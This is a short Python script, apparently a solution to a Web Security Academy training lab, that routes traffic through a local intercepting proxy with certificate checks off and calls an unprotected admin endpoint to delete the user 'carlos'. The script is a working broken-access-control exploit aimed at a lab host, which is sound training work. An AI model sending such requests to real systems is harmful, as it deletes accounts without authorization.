import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} 

#navigate to admin section and delete carlos user

r = requests.get("https://0ae200f4036da7b58030c1ff00b4000a.web-security-academy.net/administrator-panel/delete?username=carlos",verify=False,proxies=proxies)
print(r.status_code)
